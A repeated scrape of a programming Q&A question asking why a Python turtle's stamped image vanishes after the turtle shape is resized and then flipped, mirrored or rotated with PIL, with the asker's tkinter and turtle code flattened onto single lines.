other size you want) by pressing the Resize turtle Image button at the bottom of the screen. Two dialogs will pop up in succession. Enter the width of 800 (or your own width) in the first dialog, and then enter the height of 400 (or your own height) in the second dialog, and after you finish, the image will change size according to the dimensions provided (or set image back to the original dimension(s) depending on whether or not you pressed cancel).Select the Stamp button at the bottom of the window. The image is stamped onto the canvas, and the turtle moves forward 400 pixels ""behind"" the stamped image.OPTIONAL: Click anywhere on the canvas to take the turtle to that spot.Flip/mirror/rotate the image.As you can see, after doing all this, just as you flip/mirror/rotate the image, the stamped image just disappears. What is wrong with my TurtleImageResize function that is causing this to occur?EDIT # 2: Just in case this information is useful, I am running Python 3.5.1 on a Macintosh with OS version 10.11.2 (El Capitan). <code>  def TurtleShape(): try: # Tkinter buttons related to turtle manipulation manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) originalButton.config(state = NORMAL) resetturtle.config(state = NORMAL) rotateButton.config(state = NORMAL) # Ask user for file name from tkinter file dialog, and return file name as `klob` global klob klob = filedialog.askopenfilename() global im # Open `klob` and return as `im` im = Image.open(klob) # Append `im` to pictures deque pictures.append(im) # Clear `edited` deque edited.clear() # Save `im` as an image, then register image as shape, and finally set image as turtle shape im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + '.gif') update() except: # If user selects cancel in file dialog, then pass passdef StampPic(): stamp() draw_space() # Go forward 100 pixels with pen up after every stamp update() def TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 # width = original size of image width = im.size[0] # height = original height of image height = im.size[1] # Allow user to enter new width for image NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) # Allow user to enter new height for image NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) # Set width to user input if user input is NOT nothing. Otherwise, use `width` as picture width. Picwidth = NewOne2 if NewOne2 != None else width # Set height to user input if user input is NOT None. Otherwise, use `height` as picture height. Picheight = NewOne if NewOne != None else height try: # Secondary Step: Take ORIGINAL image appended to `jiop` (from `except:` code block succeeding `try:` code block) and resize THAT image each time this function is called twice in a row. Otherwise, if ONLY called as a secondary step, take previously edited image from `edited` deque, resize that, and append newly edited image to the `edited` deque. try: # `jiop` is a deque hye = jiop.pop() jiop.append(hye) print(""Jiop"") except: hye = edited.pop() jiop.append(hye) print(""Edited"") # Resize Image to Picwidth and Picheight editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) print(""Hooplah!"") except: # Intial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` geer = pictures.pop() # Resize Image to Picwidth and Picheight editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) print(""Normal"") # Save image as `.gif` editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') # Register image as a shape, and use it as shape of turtle register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update() def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: # Secondary step: Take previously edited image from `edited` deque, manipulate that, and append newly edited image to the `edited` deque jiop.clear() ghy = edited.pop() # Flip image over horizontal line kpl = ImageOps.flip(ghy) edited.append(kpl) print(""Jlop"") except: # Initial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` neer = pictures.pop() # Flip image over horizontal line kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") # Save image as `.gif` kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") # Register image as a shape, and use it as shape of turtle register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() # Flip image over vertical line fgrt = ImageOps.mirror(jui) edited.append(fgrt) except: bbc = pictures.pop() # Flip image over vertical line fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() # Rotate image 90 right fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) except: bolt = pictures.pop() # Rotate image 90 right fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update() import os,shutil,subprocess, sysher = sys.platformif her == ""win32"": print(""Windows is your Operating System"") win_gs = [""gs"",""gswin32c"",""gswin64c""] if all( shutil.which(gs_version) is None for gs_version in win_gs ): paths = [""C:\\Program Files\\gs\\gs9.18\\bin"",""C:\\Program Files (x86)\\gs\\gs9.18\\bin""] for path in (x for x in paths if os.path.exists(x)): os.environ[""PATH""] += "";"" + path break if any( shutil.which(gs_version) for gs_version in win_gs ): print(""GhostScript 9.18 for Windows found and utilized"") else: print(""You do not have GhostScript 9.18 installed for Windows. Please install it."") sys.exit(0) else: print(""GhostScript 9.18 for Windows found and utilized"")elif her == 'darwin': print(""Macintosh is your Operating System"") if shutil.which(""gs"") is None: os.environ[""PATH""] += "":/usr/local/bin"" if shutil.which(""gs"") is None: print(""You do not have GhostScript installed for Macintosh. Please install it."") sys.exit(0) else: print(""GhostScript for Macintosh found and utilized"")from turtle import *from tkinter import *try: import tkinter.filedialog as filedialogexcept ImportError: passimport collectionsfrom PIL import Image, ImageEnhance, ImageOpsjiop = collections.deque()pictures = collections.deque()edited = collections.deque()picwidth = collections.deque()picheight = collections.deque()def draw_space(): # Draw a space 200 pixels wide. penup() forward(200) pendown()def TurtleShape(): try: manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) rotateButton.config(state = NORMAL) global klob klob = filedialog.askopenfilename() global im im = Image.open(klob) pictures.append(im) edited.clear() im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + '.gif') update() except AttributeError: passdef TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 width = im.size[0] height = im.size[1] NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) Picwidth = NewOne2 if NewOne2 != None else width picwidth.append(Picwidth) Picheight = NewOne if NewOne != None else height picheight.append(Picheight) try: try: hye = jiop.pop() jiop.append(hye) except: hye = edited.pop() jiop.append(hye) editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) pictures.append(editpic) except: geer = pictures.pop() editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update()def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: jiop.clear() ghy = edited.pop() kpl = ImageOps.flip(ghy) edited.append(kpl) pictures.append(kpl) print(""Jlop"") except: neer = pictures.pop() kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() fgrt = ImageOps.mirror(jui) edited.append(fgrt) pictures.append(fgrt) except: bbc = pictures.pop() fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) pictures.append(fetch) except: bolt = pictures.pop() fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update()def StampPic(): stamp() draw_space() update()def move_turtle(): # Pick up the turtle and move it to its starting location. penup() goto(-200, 100) pendown()def settings(): # Tkinter buttons turtlepic = Button(text = ""Set Turtle Image"", command = TurtleShape) turtlepic.pack(side = 'left') stampimage = Button(text = ""Stamp"", command = StampPic) stampimage.pack(side = 'left') global manipulateimage manipulateimage = Button(text = ""Resize Turtle Image"", command = TurtleImageResize, state = DISABLED) manipulateimage.pack(side = 'left') global flipButton flipButton = Button(text = ""Flip image"", command = flippic, state = DISABLED) flipButton.pack(side = 'left') global mirrorButton mirrorButton = Button(text = ""Mirror Image"", command = mirror, state = DISABLED) mirrorButton.pack(side = 'left') global rotateButton rotateButton = Button(text = ""Rotate Image"", command = rotatePic, state = DISABLED) rotateButton.pack(side = 'left')def skip(x, y): penup() goto(x, y) pendown() update()move_turtle()settings()speed(0)tracer(0, 0)onscreenclick(skip)if sys.platform == 'win32': input()else: pass",Python turtle stamp mysteriously disappears after turtle shape's image manipulation
Python turtle stamp disappearing after turtle shape's image manipulation," Orientation:I have created the following functions to allow the user to change the turtle to an image of the his/her choosing and then stamp it to the canvas at any point: The image can also be manipulated to the user's choosing by these other functions:Resize function This function works either as a first or secondary function. First meaning that it is called initially, and secondary meaning it edits an already edited image. So, if ONLY called first, this function will take the image appended to the pictures deque, resize that, and output the edited image as a .gif image, which will be the new shape of the turtle. However, if called two times or more in a row, because of an issue where resizing the same picture more than once will result in a distorted image, I had to create another deque jiop which saves the original item from the pictures deque, and whenever this function is called more than once in a row, that original image is resized every time, instead of the same image each time. But, if ONLY called as a secondary function, then the function will simply take the current image from the edited deque, resize that image, and then set that as the turtle's new shape: Flip, Rotate, and Mirror functions - These work rather simpler than the resize function above. If called initially, they each will take the image from the pictures deque, manipulate it, append that edited image to the edited deque, then change the turtle ""shape"" to that new image. However, if called second, they each will take the image from the edited deque, manipulate that, re-append the manipulated image back to the edited deque, then set that as the turtle's new ""shape"". These functions are shown below: This way ALL the editing functions work together on essentially the same fundamental image. The Issue:Now, consider that the user wants to take the turtle image and then resize it to the size, for instance, 800x400, and stamp it to a specific spot on the canvas. After that, the user decides to move the turtle image to another spot on the canvas, flip the image, and then stamp the image there. There should now be two images right? One stamped, and the other flipped? However, with my program, for some reason, that is not the case. Instead, the stamped image disappears the moment the user flips the turtle image, even though there is no clear() function to be found anywhere (to show you what I mean, refer to the edit below). Apparently this issue ONLY occurs after the TurtleImageResize function is called.What is wrong in my TurtleImageResize function that is leading to this issue? I had completely revamped the turtle shape's image management process to what it is right now in hopes that it will fix this issue that I was also experiencing with my previous setup, but apparently, that is STILL not the case. Therefore, any help with this issue is greatly appreciated!EDIT: Below is a minimal, complete, and verifiable way to reproduce the issue I am having (MUST have PIL (or Pillow) and GhostScript installed in order for this to work): When/if you have both GhostScript and PIL (or Pillow) installed on your system, to reproduce my issue, please do the following (All steps required except step # 4):Click the Set Turtle Image button at bottom of window, select any image you want the turtle to be, then press Open. The turtle gets set to that image.Resize the Image to 800x400 (or any other size you want) by pressing the Resize turtle Image button at the bottom of the screen. Two dialogs will pop up in succession. Enter the width of 800 (or your own width) in the first dialog, and then enter the height of 400 (or your own height) in the second dialog, and after you finish, the image will change size according to the dimensions provided (or set image back to the original dimension(s) depending on whether or not you pressed cancel).Select the Stamp button at the bottom of the window. The image is stamped onto the canvas, and the turtle moves forward 400 pixels ""behind"" the stamped image.OPTIONAL: Click anywhere on the canvas to take the turtle to that spot.Flip/mirror/rotate the image.As you can see, after doing all this, just as you flip/mirror/rotate the image, the stamped image just disappears. What is wrong with my TurtleImageResize function that is causing this to occur?EDIT # 2: Just in case this information is useful, I am running Python 3.5.1 on a Macintosh with OS version 10.11.2 (El Capitan). <code>  def TurtleShape(): try: # Tkinter buttons related to turtle manipulation manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) originalButton.config(state = NORMAL) resetturtle.config(state = NORMAL) rotateButton.config(state = NORMAL) # Ask user for file name from tkinter file dialog, and return file name as `klob` global klob klob = filedialog.askopenfilename() global im # Open `klob` and return as `im` im = Image.open(klob) # Append `im` to pictures deque pictures.append(im) # Clear `edited` deque edited.clear() # Save `im` as an image, then register image as shape, and finally set image as turtle shape im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + '.gif') update() except: # If user selects cancel in file dialog, then pass passdef StampPic(): stamp() draw_space() # Go forward 100 pixels with pen up after every stamp update() def TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 # width = original size of image width = im.size[0] # height = original height of image height = im.size[1] # Allow user to enter new width for image NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) # Allow user to enter new height for image NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) # Set width to user input if user input is NOT nothing. Otherwise, use `width` as picture width. Picwidth = NewOne2 if NewOne2 != None else width # Set height to user input if user input is NOT None. Otherwise, use `height` as picture height. Picheight = NewOne if NewOne != None else height try: # Secondary Step: Take ORIGINAL image appended to `jiop` (from `except:` code block succeeding `try:` code block) and resize THAT image each time this function is called twice in a row. Otherwise, if ONLY called as a secondary step, take previously edited image from `edited` deque, resize that, and append newly edited image to the `edited` deque. try: # `jiop` is a deque hye = jiop.pop() jiop.append(hye) print(""Jiop"") except: hye = edited.pop() jiop.append(hye) print(""Edited"") # Resize Image to Picwidth and Picheight editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) print(""Hooplah!"") except: # Intial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` geer = pictures.pop() # Resize Image to Picwidth and Picheight editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) print(""Normal"") # Save image as `.gif` editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') # Register image as a shape, and use it as shape of turtle register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update() def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: # Secondary step: Take previously edited image from `edited` deque, manipulate that, and append newly edited image to the `edited` deque jiop.clear() ghy = edited.pop() # Flip image over horizontal line kpl = ImageOps.flip(ghy) edited.append(kpl) print(""Jlop"") except: # Initial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` neer = pictures.pop() # Flip image over horizontal line kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") # Save image as `.gif` kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") # Register image as a shape, and use it as shape of turtle register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() # Flip image over vertical line fgrt = ImageOps.mirror(jui) edited.append(fgrt) except: bbc = pictures.pop() # Flip image over vertical line fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() # Rotate image 90 right fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) except: bolt = pictures.pop() # Rotate image 90 right fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update() import os,shutil,subprocess, sysher = sys.platformif her == ""win32"": print(""Windows is your Operating System"") win_gs = [""gs"",""gswin32c"",""gswin64c""] if all( shutil.which(gs_version) is None for gs_version in win_gs ): paths = [""C:\\Program Files\\gs\\gs9.18\\bin"",""C:\\Program Files (x86)\\gs\\gs9.18\\bin""] for path in (x for x in paths if os.path.exists(x)): os.environ[""PATH""] += "";"" + path break if any( shutil.which(gs_version) for gs_version in win_gs ): print(""GhostScript 9.18 for Windows found and utilized"") else: print(""You do not have GhostScript 9.18 installed for Windows. Please install it."") sys.exit(0) else: print(""GhostScript 9.18 for Windows found and utilized"")elif her == 'darwin': print(""Macintosh is your Operating System"") if shutil.which(""gs"") is None: os.environ[""PATH""] += "":/usr/local/bin"" if shutil.which(""gs"") is None: print(""You do not have GhostScript installed for Macintosh. Please install it."") sys.exit(0) else: print(""GhostScript for Macintosh found and utilized"")from turtle import *from tkinter import *try: import tkinter.filedialog as filedialogexcept ImportError: passimport collectionsfrom PIL import Image, ImageEnhance, ImageOpsjiop = collections.deque()pictures = collections.deque()edited = collections.deque()picwidth = collections.deque()picheight = collections.deque()def draw_space(): # Draw a space 200 pixels wide. penup() forward(200) pendown()def TurtleShape(): try: manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) rotateButton.config(state = NORMAL) global klob klob = filedialog.askopenfilename() global im im = Image.open(klob) pictures.append(im) edited.clear() im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + '.gif') update() except AttributeError: passdef TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 width = im.size[0] height = im.size[1] NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) Picwidth = NewOne2 if NewOne2 != None else width picwidth.append(Picwidth) Picheight = NewOne if NewOne != None else height picheight.append(Picheight) try: try: hye = jiop.pop() jiop.append(hye) except: hye = edited.pop() jiop.append(hye) editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) pictures.append(editpic) except: geer = pictures.pop() editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update()def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: jiop.clear() ghy = edited.pop() kpl = ImageOps.flip(ghy) edited.append(kpl) pictures.append(kpl) print(""Jlop"") except: neer = pictures.pop() kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() fgrt = ImageOps.mirror(jui) edited.append(fgrt) pictures.append(fgrt) except: bbc = pictures.pop() fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) pictures.append(fetch) except: bolt = pictures.pop() fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update()def StampPic(): stamp() draw_space() update()def move_turtle(): # Pick up the turtle and move it to its starting location. penup() goto(-200, 100) pendown()def settings(): # Tkinter buttons turtlepic = Button(text = ""Set Turtle Image"", command = TurtleShape) turtlepic.pack(side = 'left') stampimage = Button(text = ""Stamp"", command = StampPic) stampimage.pack(side = 'left') global manipulateimage manipulateimage = Button(text = ""Resize Turtle Image"", command = TurtleImageResize, state = DISABLED) manipulateimage.pack(side = 'left') global flipButton flipButton = Button(text = ""Flip image"", command = flippic, state = DISABLED) flipButton.pack(side = 'left') global mirrorButton mirrorButton = Button(text = ""Mirror Image"", command = mirror, state = DISABLED) mirrorButton.pack(side = 'left') global rotateButton rotateButton = Button(text = ""Rotate Image"", command = rotatePic, state = DISABLED) rotateButton.pack(side = 'left')def skip(x, y): penup() goto(x, y) pendown() update()move_turtle()settings()speed(0)tracer(0, 0)onscreenclick(skip)if sys.platform == 'win32': input()else: pass",Python turtle stamp mysteriously disappears after turtle shape's image manipulation
Python turtle stamp disappearing after turtle shape's image manipulation without any `clear()` function," Orientation:I have created the following functions to allow the user to change the turtle to an image of the his/her choosing and then stamp it to the canvas at any point: The image can also be manipulated to the user's choosing by these other functions:Resize function This function works either as a first or secondary function. First meaning that it is called initially, and secondary meaning it edits an already edited image. So, if ONLY called first, this function will take the image appended to the pictures deque, resize that, and output the edited image as a .gif image, which will be the new shape of the turtle. However, if called two times or more in a row, because of an issue where resizing the same picture more than once will result in a distorted image, I had to create another deque jiop which saves the original item from the pictures deque, and whenever this function is called more than once in a row, that original image is resized every time, instead of the same image each time. But, if ONLY called as a secondary function, then the function will simply take the current image from the edited deque, resize that image, and then set that as the turtle's new shape: Flip, Rotate, and Mirror functions - These work rather simpler than the resize function above. If called initially, they each will take the image from the pictures deque, manipulate it, append that edited image to the edited deque, then change the turtle ""shape"" to that new image. However, if called second, they each will take the image from the edited deque, manipulate that, re-append the manipulated image back to the edited deque, then set that as the turtle's new ""shape"". These functions are shown below: This way ALL the editing functions work together on essentially the same fundamental image. The Issue:Now, consider that the user wants to take the turtle image and then resize it to the size, for instance, 800x400, and stamp it to a specific spot on the canvas. After that, the user decides to move the turtle image to another spot on the canvas, flip the image, and then stamp the image there. There should now be two images right? One stamped, and the other flipped? However, with my program, for some reason, that is not the case. Instead, the stamped image disappears the moment the user flips the turtle image, even though there is no clear() function to be found anywhere (to show you what I mean, refer to the edit below). Apparently this issue ONLY occurs after the TurtleImageResize function is called.What is wrong in my TurtleImageResize function that is leading to this issue? I had completely revamped the turtle shape's image management process to what it is right now in hopes that it will fix this issue that I was also experiencing with my previous setup, but apparently, that is STILL not the case. Therefore, any help with this issue is greatly appreciated!EDIT: Below is a minimal, complete, and verifiable way to reproduce the issue I am having (MUST have PIL (or Pillow) and GhostScript installed in order for this to work): When/if you have both GhostScript and PIL (or Pillow) installed on your system, to reproduce my issue, please do the following (All steps required except step # 4):Click the Set Turtle Image button at bottom of window, select any image you want the turtle to be, then press Open. The turtle gets set to that image.Resize the Image to 800x400 (or any other size you want) by pressing the Resize turtle Image button at the bottom of the screen. Two dialogs will pop up in succession. Enter the width of 800 (or your own width) in the first dialog, and then enter the height of 400 (or your own height) in the second dialog, and after you finish, the image will change size according to the dimensions provided (or set image back to the original dimension(s) depending on whether or not you pressed cancel).Select the Stamp button at the bottom of the window. The image is stamped onto the canvas, and the turtle moves forward 400 pixels ""behind"" the stamped image.OPTIONAL: Click anywhere on the canvas to take the turtle to that spot.Flip/mirror/rotate the image.As you can see, after doing all this, just as you flip/mirror/rotate the image, the stamped image just disappears. What is wrong with my TurtleImageResize function that is causing this to occur?EDIT # 2: Just in case this information is useful, I am running Python 3.5.1 on a Macintosh with OS version 10.11.2 (El Capitan). <code>  def TurtleShape(): try: # Tkinter buttons related to turtle manipulation manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) originalButton.config(state = NORMAL) resetturtle.config(state = NORMAL) rotateButton.config(state = NORMAL) # Ask user for file name from tkinter file dialog, and return file name as `klob` global klob klob = filedialog.askopenfilename() global im # Open `klob` and return as `im` im = Image.open(klob) # Append `im` to pictures deque pictures.append(im) # Clear `edited` deque edited.clear() # Save `im` as an image, then register image as shape, and finally set image as turtle shape im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + '.gif') update() except: # If user selects cancel in file dialog, then pass passdef StampPic(): stamp() draw_space() # Go forward 100 pixels with pen up after every stamp update() def TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 # width = original size of image width = im.size[0] # height = original height of image height = im.size[1] # Allow user to enter new width for image NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) # Allow user to enter new height for image NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) # Set width to user input if user input is NOT nothing. Otherwise, use `width` as picture width. Picwidth = NewOne2 if NewOne2 != None else width # Set height to user input if user input is NOT None. Otherwise, use `height` as picture height. Picheight = NewOne if NewOne != None else height try: # Secondary Step: Take ORIGINAL image appended to `jiop` (from `except:` code block succeeding `try:` code block) and resize THAT image each time this function is called twice in a row. Otherwise, if ONLY called as a secondary step, take previously edited image from `edited` deque, resize that, and append newly edited image to the `edited` deque. try: # `jiop` is a deque hye = jiop.pop() jiop.append(hye) print(""Jiop"") except: hye = edited.pop() jiop.append(hye) print(""Edited"") # Resize Image to Picwidth and Picheight editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) print(""Hooplah!"") except: # Intial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` geer = pictures.pop() # Resize Image to Picwidth and Picheight editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) print(""Normal"") # Save image as `.gif` editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') # Register image as a shape, and use it as shape of turtle register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update() def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: # Secondary step: Take previously edited image from `edited` deque, manipulate that, and append newly edited image to the `edited` deque jiop.clear() ghy = edited.pop() # Flip image over horizontal line kpl = ImageOps.flip(ghy) edited.append(kpl) print(""Jlop"") except: # Initial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` neer = pictures.pop() # Flip image over horizontal line kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") # Save image as `.gif` kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") # Register image as a shape, and use it as shape of turtle register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() # Flip image over vertical line fgrt = ImageOps.mirror(jui) edited.append(fgrt) except: bbc = pictures.pop() # Flip image over vertical line fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() # Rotate image 90 right fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) except: bolt = pictures.pop() # Rotate image 90 right fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update() import os,shutil,subprocess, sysher = sys.platformif her == ""win32"": print(""Windows is your Operating System"") win_gs = [""gs"",""gswin32c"",""gswin64c""] if all( shutil.which(gs_version) is None for gs_version in win_gs ): paths = [""C:\\Program Files\\gs\\gs9.18\\bin"",""C:\\Program Files (x86)\\gs\\gs9.18\\bin""] for path in (x for x in paths if os.path.exists(x)): os.environ[""PATH""] += "";"" + path break if any( shutil.which(gs_version) for gs_version in win_gs ): print(""GhostScript 9.18 for Windows found and utilized"") else: print(""You do not have GhostScript 9.18 installed for Windows. Please install it."") sys.exit(0) else: print(""GhostScript 9.18 for Windows found and utilized"")elif her == 'darwin': print(""Macintosh is your Operating System"") if shutil.which(""gs"") is None: os.environ[""PATH""] += "":/usr/local/bin"" if shutil.which(""gs"") is None: print(""You do not have GhostScript installed for Macintosh. Please install it."") sys.exit(0) else: print(""GhostScript for Macintosh found and utilized"")from turtle import *from tkinter import *try: import tkinter.filedialog as filedialogexcept ImportError: passimport collectionsfrom PIL import Image, ImageEnhance, ImageOpsjiop = collections.deque()pictures = collections.deque()edited = collections.deque()picwidth = collections.deque()picheight = collections.deque()def draw_space(): # Draw a space 200 pixels wide. penup() forward(200) pendown()def TurtleShape(): try: manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) rotateButton.config(state = NORMAL) global klob klob = filedialog.askopenfilename() global im im = Image.open(klob) pictures.append(im) edited.clear() im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + 